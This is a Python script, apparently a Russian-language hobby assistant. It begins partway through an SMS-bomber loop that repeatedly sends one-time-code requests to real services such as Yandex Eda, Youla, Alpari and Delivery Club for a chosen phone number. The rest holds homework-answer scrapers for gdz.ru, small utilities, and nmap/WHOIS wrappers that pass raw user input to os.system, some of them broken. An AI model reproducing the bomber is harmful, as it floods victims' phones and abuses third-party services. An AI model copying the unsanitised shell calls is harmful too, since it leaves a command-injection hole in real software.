                print('[+] Wowworks отправлено!')
            except:
                print('[-] Wowworks не отправлено!')

            try:
                requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                              json={"phone_number": "+" + _phone})
                print('[+] Eda.Yandex отправлено!')
            except:
                print('[-] Eda.Yandex не отправлено!')

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
                print('[+] Youla отправлено!')
            except:
                print('[-] Youla не отправлено!')

            try:
                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                              json={"client_type": "personal", "email": "{email}@gmail.ru".format(email),
                                    "mobile_phone": _phone, "deliveryOption": "sms"})
                print('[+] Alpari отправлено!')
            except:
                print('[-] Alpari не отправлено!')

            try:
                requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                              data={"phone": _phone})
                print('[+] SMS отправлено!')
            except:
                print('[-] SMS не отправлено!')

            try:
                requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
                print('[+] Delivery отправлено!')
            except:
                print('[-] Delivery не отправлено!')

            try:
                iteration += 1
                print(('{} круг пройден.').format(iteration))
            except:
                break


def GDZ():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    hack_text = 'SOUP : DONE' #TODO: ХАК-ТЕКСТ
    if mess.find('русск') != -1:
        nom = input('Номер: ')
        if nom == '' or nom == None:
            while True:
                nom = input('Номер: ')
                if nom != '' and nom != None:
                    break
        url = 'https://gdz.ru/class-7/russkii_yazik/razumovskaja-lvova-7/' + nom + '-nom/'
        print(url, '\n')
        sourse = requests.get(url)
        main_text = sourse.text

        soup = BeautifulSoup(main_text, features='lxml')
        print(hack_text)
        table = soup.findAll('div', {'class': 'with-overtask'})
        index = 0
        for i in table:
            tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
            tr = 'https:' + str(tr[0]) + str(tr[1])
            index += 1
            print(tr)

    if mess.find('англ') != -1 and mess.find('язык') != -1:
        if mess.find('тетра') != -1:
            s = input('Страница: ')
            if s == '' or s == None:
                while True:
                    s = input('Страница: ')
                    if s != '' and s != None:
                        break
            url = 'https://gdz.ru/class-7/english/workbook-spotlight-7/' + s + '-s/'
            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)
        else:
            s = input('Страница: ')
            if s == '' or s == None:
                while True:
                    s = input('Страница: ')
                    if s != '' and s != None:
                        break
            url = 'https://gdz.ru/class-7/english/reshebnik-angliyskiy-v-fokuse-vaulina-yu-e/' + s + '-s/'
            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)

    if mess.find('алгебр') != -1:
        if mess.find('дидакти') != -1:
            job = input('Самостоятельная (1); Контрольная (2): ').lower()
            url = ''
            if job == '1' or job == 'сам' or job == '':
                variant = input('Введите вариант(1, 2): ').lower()

                if variant == '1' or variant == '' or variant == 'один':
                    k_variant = '1'
                    independent_work = input('Самостоятельная работа номер: ')

                elif variant == '2' or variant == 'два':
                    k_variant = '2'
                    independent_work = input('Самостоятельная работа номер: ')
                nom = input('Номер: ')
                if nom == '' or nom == None:
                    while True:
                        nom = input('Номер: ')
                        if nom != '' and nom != None:
                            break
                url = 'https://gdz.ru/class-7/algebra/zvavich-kuznecova-15/' + k_variant + '-' + independent_work + '-independ-' + nom + '/'
            if job == '2' or job == 'контр' or job == 'два':
                kontr_variant = input('Введите название к/р(4a, 4): ').lower()
                if kontr_variant == '1':
                    k_kontr_variant = '1'
                elif kontr_variant == '1a' or kontr_variant == '1а':
                    k_kontr_variant = '2'
                elif kontr_variant == '2':
                    k_kontr_variant = '3'
                elif kontr_variant == '2a' or kontr_variant == '2а':
                    k_kontr_variant = '4'
                elif kontr_variant == '3':
                    k_kontr_variant = '5'
                elif kontr_variant == '3a' or kontr_variant == '3а':
                    k_kontr_variant = '6'
                elif kontr_variant == '4':
                    k_kontr_variant = "7"
                elif kontr_variant == '4a' or kontr_variant == '4а':
                    k_kontr_variant = "8"
                elif kontr_variant == '5':
                    k_kontr_variant = '9'
                elif kontr_variant == '5a' or kontr_variant == '5а':
                    k_kontr_variant = "10"
                else:
                    k_kontr_variant = kontr_variant
                variant = input('Введите вариант: ').lower()
                if variant == '':
                    variant = '1'
                nom = input('Номер: ')
                if nom == '' or nom == None:
                    while True:
                        nom = input('Номер: ')
                        if nom != '' and nom != None:
                            break
                url = 'https://gdz.ru/class-7/algebra/zvavich-kuznecova-15/' + k_kontr_variant + '-' + variant + '-kontrol-' + nom + '/'

            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)
        else:
            nom = input('Номер: ')
            if nom == '' or nom == None:
                while True:
                    nom = input('Номер: ')
                    if nom != '' and nom != None:
                        break
            url = 'https://gdz.ru/class-7/algebra/makarichev-18/' + nom + '-nom/'
            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)

    if mess.find('геомет') != -1:
        if mess.find('дидакт') != -1:
            nom = input('Номер: ')
            if nom == '' or nom == None:
                while True:
                    nom = input('Номер: ')
                    if nom != '' and nom != None:
                        break
            url = 'https://gdz.ru/class-7/geometria/reshebnik-rabochaya-tetrad-k-uchebniku-geometriya-7-9-atanasyana-l-s/' + nom + '-nom/'
            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)
        else:
            nom = input('Номер: ')
            if nom == '' or nom == None:
                while True:
                    nom = input('Номер: ')
                    if nom != '' and nom != None:
                        break
            if 1 <= int(nom) <= 86:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/1-chapter-' + nom + '/'

            if 87 <= int(nom) <= 185:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/2-chapter-' + nom + '/'

            if 186 <= int(nom) <= 222:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/3-chapter-' + nom + '/'

            if 223 <= int(nom) <= 362:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/4-chapter-' + nom + '/'

            if 363 <= int(nom) <= 444:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/5-chapter-' + nom + '/'

            if 445 <= int(nom) <= 532:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/6-chapter-' + nom + '/'

            if 533 <= int(nom) <= 630:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/7-chapter-' + nom + '/'

            if 631 <= int(nom) <= 737:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/8-chapter-' + nom + '/'

            if 738 <= int(nom) <= 910:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/9-chapter-' + nom + '/'

            if 911 <= int(nom) <= 1010:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/10-chapter-' + nom + '/'

            if 1011 <= int(nom) <= 1077:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/11-chapter-' + nom + '/'

            if 1078 <= int(nom) <= 1147:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/12-chapter-' + nom + '/'

            if 1148 <= int(nom) <= 1183:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/13-chapter-' + nom + '/'

            if 1184 <= int(nom) <= 1310:
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/14-chapter-' + nom + '/'

            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)

    if mess.find('истори') != -1:
        if mess.find('тетра') != -1:
            job = input('§(1); Итоги главы(2): ').lower()
            if job == '' or job == '1' or job == "один":
                paragraph = input('§: ')
                if paragraph == '' or paragraph == None:
                    while True:
                        paragraph = input('Введите параграф: ')
                        if paragraph != '' and paragraph != None:
                            break
                if paragraph == '6':
                    paragraph = '5'
                if paragraph == '2':
                    paragraph = '1'
                if paragraph == '9':
                    paragraph = '8'
                if paragraph == '22':
                    paragraph = '21'
                if paragraph == '25':
                    paragraph = '24'
                url = 'https://gdz.ru/class-7/istoriya/klokov-tetrad/' + paragraph + '-item/'
            else:
                nom = input('Введите номер главы: ')
                if nom == '' or nom == None:
                    while True:
                        nom = input('Номер: ')
                        if nom != '' and nom != None:
                            break
                url = 'https://gdz.ru/class-7/istoriya/klokov-tetrad/' + nom + '-ichapter/'
            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)
        else:
            job = input('§(1); Итоги главы(2): ').lower()
            if job == '' or job == '1' or job == "один":
                paragraph = input('§: ')
                if paragraph == '' or paragraph == None:
                    while True:
                        paragraph = input('Введите параграф: ')
                        if paragraph != '' and paragraph != None:
                            break

                if paragraph == '6':
                    paragraph = '5'
                if paragraph == '2':
                    paragraph = '1'
                if paragraph == '9':
                    paragraph = '8'
                if paragraph == '22':
                    paragraph = '21'
                if paragraph == '25':
                    paragraph = '24'
                url = 'https://gdz.ru/class-7/istoriya/andreev/' + paragraph + '-item/'
            else:
                nom = input('Введите номер главы: ')
                if nom == '' or nom == None:
                    while True:
                        nom = input('Номер: ')
                        if nom != '' and nom != None:
                            break
                url = 'https://gdz.ru/class-7/istoriya/andreev/' + nom + '-ichapter/'
            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)

    if mess.find('хими') != -1:
        paragraph = input('Введите параграф: ')
        if paragraph == '' or paragraph == None:
            while True:
                paragraph = input('Введите параграф: ')
                if paragraph != '' and paragraph != None:
                    break
        nom = input('Номер: ')
        if nom == '' or nom == None:
            while True:
                nom = input('Номер: ')
                if nom != '' and nom != None:
                    break
        url = 'https://gdz.ru/class-7/himiya/gabrielyan-vvodnij-kurs/' + paragraph + '-quest-' + nom + '/'
        print(url, '\n')
        sourse = requests.get(url)
        main_text = sourse.text

        soup = BeautifulSoup(main_text, features='lxml')
        print(hack_text)
        table = soup.findAll('div', {'class': 'with-overtask'})
        index = 0
        for i in table:
            tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
            tr = 'https:' + str(tr[0]) + str(tr[1])
            index += 1
            print(tr)

    if mess.find('литерат') != -1:
        s = input('Страница: ')
        if s == '' or s == None:
            while True:
                s = input('Страница: ')
                if s != '' and s != None:
                    break
        if s == '5':
            s = '4'
        elif s == '51':
            s = '50'
        elif s == '76':
            s = '75'
        elif s == '170':
            s = '169'
        elif s == '192':
            s = '191'
        url = 'https://gdz.ru/class-7/literatura/merkin/1-prt-' + s + '/'
        print(url, '\n')
        sourse = requests.get(url)
        main_text = sourse.text

        soup = BeautifulSoup(main_text, features='lxml')
        print(hack_text)
        table = soup.findAll('div', {'class': 'with-overtask'})
        index = 0
        for i in table:
            tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
            tr = 'https:' + str(tr[0]) + str(tr[1])
            index += 1
            print(tr)


def joke_savvareev():
    otvet = []
    x = random.randint(1, 19)
    url = 'https://www.savvateev.xyz/jokes/?page=' + str(x)

    sourse = requests.get(url)
    main_text = sourse.text

    soup = BeautifulSoup(main_text, features='lxml')
    table = soup.findAll('div', {'class': 'jokes--column--joke'})
    tr = str(soup.findAll('div', {'class': 'jokes--column--joke__content'})).split('p>')
    for i in tr:
        if tr.index(i) % 2 != 0:
            otvet.append(i[:-2])
    return(random.choice(otvet))

def Wikipedia():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    wikipedia.set_lang('ru')
    clean_mess = []
    mess_split = mess.split(' ')
    for a in mess_split:
        if a != 'покажи' and a != 'расскажи' and a != 'скажи' and a != 'про' and a != 'найди' and a != 'значение' \
                and a != 'смысл' and a != 'что' and a != 'значит' and a != 'означает' and a != 'такое' and a != 'в' \
                and a != 'википедии' and a != 'выражения' and a != 'предложения' and a != 'словосочетания' and a != 'кто' \
                and a != 'такой':
            clean_mess.append(a)
    print(''.join(clean_mess))
    translatable_word = ' '.join(clean_mess)
    text_ = wikipedia.summary(translatable_word, sentences=2)
    print(text_)

    translator = Translator(from_lang="english", to_lang="russian")
    translation = translator.translate(text_)

    def clear_text(test_str):
        ret = ''
        skip1c = 0
        skip2c = 0
        for i in test_str:
            if i == '[':
                skip1c += 1
            elif i == '(':
                skip2c += 1
            elif i == ']' and skip1c > 0:
                skip1c -= 1
            elif i == ')' and skip2c > 0:
                skip2c -= 1
            elif skip1c == 0 and skip2c == 0:
                ret += i
        return ret

    translation = clear_text(translation)
    return (translation)


def multiplication_workout():
    while True:
        a = random.randint(0, 1000)
        b = random.randint(0, 1000)
        c = a * b
        ab = str(a) + ' * ' + str(b) + ' = '
        user_response = input(ab)
        if user_response.isdigit() == False:
            while True:
                if user_response == 'стоп':
                    break
                user_response = input(ab)
                if user_response.isdigit() == True:
                    break
        if user_response == 'стоп':
            break
        if int(user_response) == c:
            cprint(' ' * int(len(str(ab) + str(c))), 'green', 'on_green')
            print('    Верно')
        else:
            cprint(' ' * int(len(str(ab) + str(c))), 'red', 'on_red')
            print('    Не верно')
            print(ab, c, sep='')

def theorem_sum_angles_in_triangle():
    print(
        '             B                       \n______________________________________  a       Дано: Δ ABC\n'
        '         4  /  ¯¯--_ 5                          \n           /   2    ¯¯-__                       '
        'Доказать: ∠1 + ∠2 + ∠3 = 180°\n          /              ¯--_\n         /  1             3  ¯¯-__\n'
        '________/_________________________¯-___\n       A                               C\n\n'
        '                                     Доказательство:\n_\n| Посторим прямую a || AC через B\n-\n'
        '__                                                        _\n|| ∠4 + ∠2 + ∠5 = 180° '
        '(т.к. углы смежные)                 \ \n-- ∠4 = ∠1 (т.к. накрест лежащие при a || AC и секущей AB) '
        ' | => ∠1 + ∠2 + ∠3 = 180°\n   ∠5 = ∠3 (т.к. накрест лежащие при a || AC и секущей BC)    /\n          '
        '                                                ¯\n                                                '
        '                  Ч Т Д')

def Percent():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    if mess.find('процентов') != -1 or mess.find('от') != -1:
        print('Введите еще раз число')
    num = float(input('Введи число: '))
    percent = float(input('Введите процент от числа: '))
    return (str((num * percent) / 100))


def AZBUKA():
    # -*- coding: utf-8 -*-
    slova = input('Введите слово: ').lower()
    sloval = list(slova)
    pole = [[[]] * len(slova),
            [[]] * len(slova),
            [[]] * len(slova),
            [[]] * len(slova),
            [[]] * len(slova),
            [[]] * len(slova),
            [[]] * len(slova)]
    num = 0
    for j in sloval:
        if j == 'a':
            pole[0][num] = '   *   '
            pole[1][num] = '  * *  '
            pole[2][num] = ' *   * '
            pole[3][num] = '*     *'
            pole[4][num] = '*******'
            pole[5][num] = '*     *'
            pole[6][num] = '*     *'
        elif j == 'b':
            pole[0][num] = '****** '
            pole[1][num] = '*     *'
            pole[2][num] = '*     *'
            pole[3][num] = '****** '
            pole[4][num] = '*     *'
            pole[5][num] = '*     *'
            pole[6][num] = '****** '
        elif j == 'c':
            pole[0][num] = ' ***** '
            pole[1][num] = '*     *'
            pole[2][num] = '*      '
            pole[3][num] = '*      '
            pole[4][num] = '*      '
            pole[5][num] = '*     *'
            pole[6][num] = ' ***** '
        elif j == 'd':
            pole[0][num] = '*****  '
            pole[1][num] = '*    * '
            pole[2][num] = '*     *'
            pole[3][num] = '*     *'
            pole[4][num] = '*     *'
            pole[5][num] = '*    * '
            pole[6][num] = '*****  '
        elif j == 'e':
            pole[0][num] = '*******'
            pole[1][num] = '*      '
            pole[2][num] = '*      '
            pole[3][num] = '*****  '
            pole[4][num] = '*      '
            pole[5][num] = '*      '
            pole[6][num] = '*******'
        elif j == 'f':
            pole[0][num] = '*******'
            pole[1][num] = '*      '
            pole[2][num] = '*      '
            pole[3][num] = '*****  '
            pole[4][num] = '*      '
            pole[5][num] = '*      '
            pole[6][num] = '*      '
        elif j == 'g':
            pole[0][num] = ' ***** '
            pole[1][num] = '*     *'
            pole[2][num] = '*      '
            pole[3][num] = '*      '
            pole[4][num] = '*   ***'
            pole[5][num] = '*     *'
            pole[6][num] = '****** '
        elif j == 'h':
            pole[0][num] = '*     *'
            pole[1][num] = '*     *'
            pole[2][num] = '*     *'
            pole[3][num] = '*******'
            pole[4][num] = '*     *'
            pole[5][num] = '*     *'
            pole[6][num] = '*     *'
        elif j == 'i':
            pole[0][num] = '*******'
            pole[1][num] = '   *   '
            pole[2][num] = '   *   '
            pole[3][num] = '   *   '
            pole[4][num] = '   *   '
            pole[5][num] = '   *   '
            pole[6][num] = '*******'
        elif j == 'j':
            pole[0][num] = ' ******'
            pole[1][num] = '     * '
            pole[2][num] = '     * '
            pole[3][num] = '     * '
            pole[4][num] = '*    * '
            pole[5][num] = '*    * '
            pole[6][num] = ' ***** '
        elif j == 'k':
            pole[0][num] = '*     *'
            pole[1][num] = '*    * '
            pole[2][num] = '*   *  '
            pole[3][num] = '****   '
            pole[4][num] = '*   *  '
            pole[5][num] = '*    * '
            pole[6][num] = '*     *'
        elif j == 'l':
            pole[0][num] = '*      '
            pole[1][num] = '*      '
            pole[2][num] = '*      '
            pole[3][num] = '*      '
            pole[4][num] = '*      '
            pole[5][num] = '*      '
            pole[6][num] = '*******'
        elif j == 'm':
            pole[0][num] = '*     *'
            pole[1][num] = '**   **'
            pole[2][num] = '* * * *'
            pole[3][num] = '*  *  *'
            pole[4][num] = '*     *'
            pole[5][num] = '*     *'
            pole[6][num] = '*     *'
        elif j == 'n':
            pole[0][num] = '*     *'
            pole[1][num] = '**    *'
            pole[2][num] = '* *   *'
            pole[3][num] = '*  *  *'
            pole[4][num] = '*   * *'
            pole[5][num] = '*    **'
            pole[6][num] = '*     *'

        elif j == 'o':
            pole[0][num] = '*******'
            pole[1][num] = '*     *'
            pole[2][num] = '*     *'
            pole[3][num] = '*     *'
            pole[4][num] = '*     *'
            pole[5][num] = '*     *'
            pole[6][num] = '*******'

        elif j == 'p':
            pole[0][num] = '****** '
            pole[1][num] = '*     *'
            pole[2][num] = '*     *'
            pole[3][num] = '****** '
            pole[4][num] = '*      '
            pole[5][num] = '*      '
            pole[6][num] = '*      '
        elif j == 'q':
            pole[0][num] = '*******'
            pole[1][num] = '*     *'
            pole[2][num] = '*     *'
            pole[3][num] = '*     *'
            pole[4][num] = '*   * *'
            pole[5][num] = '*******'
            pole[6][num] = '     * '
        elif j == 'r':
            pole[0][num] = '****** '
            pole[1][num] = '*     *'
            pole[2][num] = '*     *'
            pole[3][num] = '****** '
            pole[4][num] = '*   *  '
            pole[5][num] = '*    * '
            pole[6][num] = '*     *'
        elif j == 's':
            pole[0][num] = ' ***** '
            pole[1][num] = '*     *'
            pole[2][num] = '*      '
            pole[3][num] = ' ***** '
            pole[4][num] = '      *'
            pole[5][num] = '      *'
            pole[6][num] = ' ***** '
        elif j == 't':
            pole[0][num] = '*******'
            pole[1][num] = '   *   '
            pole[2][num] = '   *   '
            pole[3][num] = '   *   '
            pole[4][num] = '   *   '
            pole[5][num] = '   *   '
            pole[6][num] = '   *   '
        elif j == 'u':
            pole[0][num] = '*     *'
            pole[1][num] = '*     *'
            pole[2][num] = '*     *'
            pole[3][num] = '*     *'
            pole[4][num] = '*     *'
            pole[5][num] = '*     *'
            pole[6][num] = '*******'
        elif j == 'v':
            pole[0][num] = '*     *'
            pole[1][num] = '*     *'
            pole[2][num] = '*     *'
            pole[3][num] = ' *   * '
            pole[4][num] = ' *   * '
            pole[5][num] = '  * *  '
            pole[6][num] = '   *   '
        elif j == 'w':
            pole[0][num] = '*     *'
            pole[1][num] = '*  *  *'
            pole[2][num] = '*  *  *'
            pole[3][num] = '*  *  *'
            pole[4][num] = '*  *  *'
            pole[5][num] = '*  *  *'
            pole[6][num] = ' ** ** '
        elif j == 'x':
            pole[0][num] = '*     *'
            pole[1][num] = ' *   * '
            pole[2][num] = '  * *  '
            pole[3][num] = '   *   '
            pole[4][num] = '  * *  '
            pole[5][num] = ' *   * '
            pole[6][num] = '*     *'
        elif j == 'y':
            pole[0][num] = '*     *'
            pole[1][num] = '*     *'
            pole[2][num] = ' *   * '
            pole[3][num] = '  * *  '
            pole[4][num] = '   *   '
            pole[5][num] = '   *   '
            pole[6][num] = '   *   '
        elif j == 'z':
            pole[0][num] = '*******'
            pole[1][num] = '     * '
            pole[2][num] = '    *  '
            pole[3][num] = '   *   '
            pole[4][num] = '  *    '
            pole[5][num] = ' *     '
            pole[6][num] = '*******'
        elif j == ' ':
            pole[0][num] = '   '
            pole[1][num] = '   '
            pole[2][num] = '   '
            pole[3][num] = '   '
            pole[4][num] = '   '
            pole[5][num] = '   '
            pole[6][num] = '   '
        elif j == '.':
            pole[0][num] = '    '
            pole[1][num] = '    '
            pole[2][num] = '    '
            pole[3][num] = '    '
            pole[4][num] = '    '
            pole[5][num] = ' ** '
            pole[6][num] = ' ** '
        elif j == ':':
            pole[0][num] = ' ** '
            pole[1][num] = ' ** '
            pole[2][num] = '    '
            pole[3][num] = '    '
            pole[4][num] = '    '
            pole[5][num] = ' ** '
            pole[6][num] = ' ** '

        elif j == ',':
            pole[0][num] = ' ** '
            pole[1][num] = ' ** '
            pole[2][num] = '    '
            pole[3][num] = '    '
            pole[4][num] = '    '
            pole[5][num] = ' ** '
            pole[6][num] = ' ** '
        else:
            pass
        num += 1

    for i in pole:
        i = '  '.join(i)
        print(i)


def Nmap():
    file_read = open('A_command.py', 'r')
    mess = file_read.read()[13:-1]
    print('[01] ИНТЕНСИВНЫЙ СКАН\n'
          '[02] ИНТЕНСИВНЫЙ СКАН, ВСЕ TCP-ПОРТЫ\n'
          '[03] ИНТЕНСИВНЫЙ СКАН, НЕТ ПИНГА\n'
          '[04] СКАН ПИНГА\n'
          '[05] БЫСТРОЕ СКАНИРОВАНИЕ\n'
          '[06] ПОКАЗАТЬ ВСЕ ОТПРАВЛЕННЫЕ И ПОЛУЧЕННЫЕ ПАКЕТЫ\n'
          '[07] Быстрое сканирование всех ваших устройств\n'
          '[08] Сканер портов')
    what = input(': ip : ').lower()
    if what.find('ip') != -1 or what.find('местополож') != -1:
        url = 'https://yandex.ru/internet/'

        sourse = requests.get(url)

        main_text = sourse.text

        soup = BeautifulSoup(main_text, features='lxml')

        what = soup.find('li', class_='parameter-wrapper general-info__parameter')
        what = what.text[10:]
        print('IP:', what)

        city = soup.find('div', class_='location-renderer__value')
        city = city.text
        print(city)


    if mess.find('интенсивн') != -1 or mess.find('1') != -1 or mess.find('2') != -1 or mess.find('3') != -1:

            if mess.find('TCP') != -1 or mess.find('1') != -1:
                print('nmap -Pn -p 1-65535 -T4 -A -v ' + what)
                os.system('nmap -Pn -p 1-65535 -T4 -A -v ' + what)

            elif mess.find('пинг') != -1 or mess.find('2') != -1:
                print('-T4 -A -v -Pn ' + what)
                os.system('-T4 -A -v -Pn ' + what)

            else:
                os.system('-T4 -A -v -Pn ' + what)
                print('nmap -T4 -A -v ' + what)

    elif mess.find('пинг') != -1 or mess.find('4') != -1 :
        print('nmap -Pn -sn ' + what)
        os.system('nmap -Pn -sn ' + what)

    elif mess.find('быстр') != -1 or mess.find('5') != -1:
        print('nmap -Pn -T4 -F ' + what)
        os.system('nmap -Pn -T4 -F ' + what)

    elif mess.find('пакет') != -1 or mess.find('6') != -1:
        print('nmap -Pn --packet-trace ' + what)
        os.system('nmap -Pn --packet-trace ' + what)

    elif mess.find('устройт') != -1 or mess.find('7') != -1:
        print('nmap -Pn -T5 $iphostname ' + what)
        os.system('nmap -Pn -T5 $iphostname ' + what)

    elif mess.find('портов') != -1 or mess.find('8') != -1:
        port = 'https://api.hackertarget.com/nmap/?q=' + what
        info = requests.get(port)
        print(info.text)

def WHOIS():
    what = input(': ip / домен: ').lower()

    if what.find('мой') != -1:
        url = 'https://yandex.ru/internet/'

        sourse = requests.get(url)

        main_text = sourse.text

        soup = BeautifulSoup(main_text, features='lxml')

        what = soup.find('li', class_='parameter-wrapper general-info__parameter')
        what = what.text[10:]
        print('IP:', what)

        city = soup.find('div', class_='location-renderer__value')
        city = city.text
        print(city)


    whois = 'https://api.hackertarget.com/whois/?q=' + what
    info = requests.get(whois)
    print(info.text)

def HOST_IP():
    what = input(': ip : ').lower()
    if what.find('ip') != -1 or what.find('местополож') != -1:
        url = 'https://yandex.ru/internet/'

        sourse = requests.get(url)

        main_text = sourse.text

        soup = BeautifulSoup(main_text, features='lxml')

        what = soup.find('li', class_='parameter-wrapper general-info__parameter')
        what = what.text[10:]
        print('IP:', what)

        city = soup.find('div', class_='location-renderer__value')
        city = city.text
        print(city)

    host = 'https://api.hackertarget.com/hostsearch/?q=' + what
    info = requests.get(host)
    print(info.text)

def HOST_DNS():
    what = input(': ip : ').lower()
    if what.find('ip') != -1 or what.find('местополож') != -1:
        url = 'https://yandex.ru/internet/'

        sourse = requests.get(url)

        main_text = sourse.text

        soup = BeautifulSoup(main_text, features='lxml')

        what = soup.find('li', class_='parameter-wrapper general-info__parameter')
        what = what.text[10:]
        print('IP:', what)

        city = soup.find('div', class_='location-renderer__value')
        city = city.text
        print(city)

    hostdns = 'https://api.hackertarget.com/mtr/?q=' + what
    info = requests.get(hostdns)
    print('\033[91m', info.text)